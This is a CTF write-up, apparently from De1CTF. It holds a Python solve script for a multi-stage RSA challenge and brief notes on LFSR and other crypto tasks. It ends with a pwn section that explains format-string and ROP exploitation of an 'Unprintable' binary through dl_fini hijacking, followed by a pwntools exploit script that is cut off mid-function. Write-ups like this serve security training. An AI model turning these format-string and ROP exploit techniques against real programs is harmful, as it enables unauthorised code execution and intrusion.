    #coding:utf8
    import binascii,gmpy2
    # from data import e1,e2,p,q1p,q1q,hint,flag,q2
    n =  [20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423L, 31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421L, 29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303L, 25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791L]
    c =  [19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569L, 15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031L, 18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446L, 2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797L]
    def CRT(mi, ai):
        assert(reduce(gmpy2.gcd,mi)==1)
        assert (isinstance(mi, list) and isinstance(ai, list))
        M = reduce(lambda x, y: x * y, mi)
        ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) for (m, a) in zip(mi, ai)]
        return reduce(lambda x, y: x + y, ai_ti_Mi) % M
    p=gmpy2.iroot(CRT(n, c), 4)[0]
    print "p = ",p
    # ====================got p
    ee1 = 42
    ee2 = 3
    ce1 =  45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384
    ce2 =  13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158
    tmp =  864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387
    n  =  15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039
    for i in xrange(200000):
        if gmpy2.iroot(ce1+n*i,42)[1]==1:
            res=gmpy2.iroot(ce1+n*i,42)[0]
            e1=res
            break
    for i in xrange(200000):
        if gmpy2.iroot(ce2+n*i,3)[1]==1:
            res=gmpy2.iroot(ce2+n*i,3)[0]
            e2=res-tmp
            break
    print "e1 = ",e1
    print "e2 = ",e2
    # ====================got e1,e2
    e = 46531
    n = 16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603
    c = 14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469
    # yafu got q1p,q1q
    q1p = 127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088835693
    q1q = 127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088834871
    if q1p>q1q:
        q1p,q1q=q1q,q1p
    # below is not necessary
    phi=(q1p-1)*(q1q-1)
    assert(gmpy2.gcd(e,phi)==1)
    d=gmpy2.invert(e,phi)
    hint=pow(c,d,n)
    hint=binascii.unhexlify(hex(hint)[2:])
    print "hint = ",hint
    # ====================got  q1p as q1
    # flag=int(binascii.hexlify(flag),16)
    q1=q1p
    print "q1 = ",q1
    q2 =  114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513
    c1 =  262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124
    c2 =  7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596
    assert(14==gmpy2.gcd(e1,(p-1)*(q1-1)))
    assert(14== gmpy2.gcd(e2,(p-1)*(q2-1)))
    e1=e1//14;e2=e2//14
    n1=p*q1;n2=p*q2
    phi1=(p-1)*(q1-1);phi2=(p-1)*(q2-1)
    d1=gmpy2.invert(e1,phi1);d2=gmpy2.invert(e2,phi2)
    f1=pow(c1,d1,n1);f2=pow(c2,d2,n2)
    def GCRT(mi, ai):
        # mi,ai分别表示模数和取模后的值,都为列表结构
        assert (isinstance(mi, list) and isinstance(ai, list))
        curm, cura = mi[0], ai[0]
        for (m, a) in zip(mi[1:], ai[1:]):
            d = gmpy2.gcd(curm, m)
            c = a - cura
            assert (c % d == 0) #不成立则不存在解
            K = c // d * gmpy2.invert(curm // d, m // d)
            cura += curm * K
            curm = curm * m // d
            cura %= curm
        return (cura % curm, curm) #(解,最小公倍数)
    f3,lcm = GCRT([n1,n2],[f1,f2])
    assert(f3%n1==f1);assert(f3%n2==f2);assert(lcm==q1*q2*p)
    n3=q1*q2
    c3=f3%n3
    phi3=(q1-1)*(q2-1)
    assert(gmpy2.gcd(7,phi3)==1)
    d3=gmpy2.invert(7,phi3)
    m3=pow(c3,d3,n3)
    if gmpy2.iroot(m3,2)[1] == 1:
        flag=gmpy2.iroot(m3,2)[0]
        print(binascii.unhexlify(hex(flag)[2:]))
    # p =  109935857933867829728985398563235455481120300859311421762540858762721955038310117609456763338082237907005937380873151279351831600225270995344096532750271070807051984097524900957809427861441436796934012393707770012556604479065826879107677002380580866325868240270494148512743861326447181476633546419262340100453
    # e1 =  15218928658178
    # e2 =  381791429275130
    # hint =  "orz...you.found.me.but.sorry.no.hint...keep.on.and.enjoy.it!"
    # q1 =  127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088834871
    # de1ctf{9b10a98b-71bb-4bdf-a6ff-f319943de21f}
    # [Finished in 0.7s]
## Babylfsr
你可以在[CTF-WIKI](https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/fsr/lfsr/)的这个部分找到有关lfsr的基本知识。并且在`BM
algorithm`下面提到可以用2n的序列恢复mask和key的方法。在这个挑战中我们知道的序列的长度只有(2n-8bits)，但是我们可以通过约束条件`FLAG[7:11]=='1224'`去爆破剩下的8bits。然后恢复mask，恢复key，最终得到明文
#### exp
  1. Code/exp.sage(解题脚本,当然你也可以使用B-M算法恢复mask)
  2. Code/task.py(使用KEY和MASK生成序列的脚本)
  3. Code/output(task.py的输出)
  4. Code/secret.py(包含MASK,KEY和FLAG)
## Obscured
Github不太支持数学公式渲染。你可以在本地渲染并查看WP。  
## Mini Purε
Github不太支持数学公式渲染。你可以在本地渲染并查看WP。  
# pwn
## Unprintable
这题其实是pwnable tw上printable一道题的变种
理论上可以不用打印栈地址出来，只要预测栈后三位就可以了
首先是劫持控制流，栈上面残留了一个ld.so的地址
在exit的时候会执行dl_fini函数，里面有一段比较有趣的片段
    : call   QWORD PTR [r12+rdx*8]
rdx固定为0，r12来自下面的代码片段
    : mov    r12,QWORD PTR [rax+0x8]
    : mov    rax,QWORD PTR [rbx+0x120]
    : add    r12,QWORD PTR [rbx]
rbx指向的刚好就是栈上残留的ld.so的地址，因此我们可以控制[rbx]的值
r12默认指向的是fini_array，通过控制rbx，我们可以让r12指向bss，也就是我们可以劫持控制流了
但是劫持控制流之后呢？
我们可以再跳回main函数
    .text:00000000004007A3                 mov     edx, 1000h      ; nbytes
    .text:00000000004007A8                 mov     esi, offset buf ; buf
    .text:00000000004007AD                 mov     edi, 0          ; fd
    .text:00000000004007B2                 call    read
再次读内容到bss段，再printf出来
如果比较细心的话，可以发现这个时候栈上第23个参数刚好指向的是printf的返回地址，也就是我们可以在printf之后再跳回0x4007A3，也就是能无限循环printf
有了无限循环printf，那么就和平常的有循环的printf一样做了
这个时候我们就有了任意写，可以写栈上printf返回地址后面的内容，写一个bss段的地址，再配合 pop rsp这个gadget就可以进行rop了
这里还有一个小坑，就是printf超过0x2000个字节之后用 %hn 写不了值，所以要爆破到适合的栈地址，不过概率也挺高的
有了rop之后呢？我们还是leak不了，这个时候可以借助一个神奇的gadget
    .text:00000000004006E8                 adc     [rbp+48h], edx
rbp和edx我们都是可以控制的，刚好bss段中有stdin,stdout,sterr这几个值，指向的是libc
所以我们可以利用这个gadget将stderr改成one_gadget，再利用__libc_csu_init中的
    call    qword ptr [r12+rbx*8]
就可以get shell了
get shell之后就挺简单了，利用重定向拿flag
    cat flag >&0
#### exp
    from pwn import *
    debug=1
    context.log_level='debug'
    if debug:
        p=process('./unprintable')
        #p=process('',env={'LD_PRELOAD':'./libc.so'})
    else:
        p=remote('',)
    def ru(x):
        return p.recvuntil(x)
    def se(x):
        p.send(x)
    def sl(x):
        p.sendline(x)
    def wait(x=True):
        #raw_input()
        sleep(0.3)
    def write_addr(addr,sz=6):
        t = (stack+0x40)%0x100
        v = p64(addr)
        for i in range(sz):
            if t+i != 0:
                se('%'+str(t+i)+'c%18$hhn%'+str(1955-t-i)+'c%23$hn\x00')
            else:
                se('%18$hhn%1955c%23$hn')
            wait()
            tv = ord(v[i])
            if tv != 0:
                se('%'+str(tv)+'c%13$hhn%'+str(1955-tv)+'c%23$hn\x00')
            else:
                se('%13$hhn%1955c%23$hn')
            wait()
    def write_value(addr,value,addr_sz=6):
        write_addr(addr,addr_sz)
        se('%'+str(ord(value[0]))+'c%14$hhn%'+str(1955-ord(value[0]))+'c%23$hn\x00')
        wait()
        ta = p64(addr)[1]
        for i in range(1,len(value)):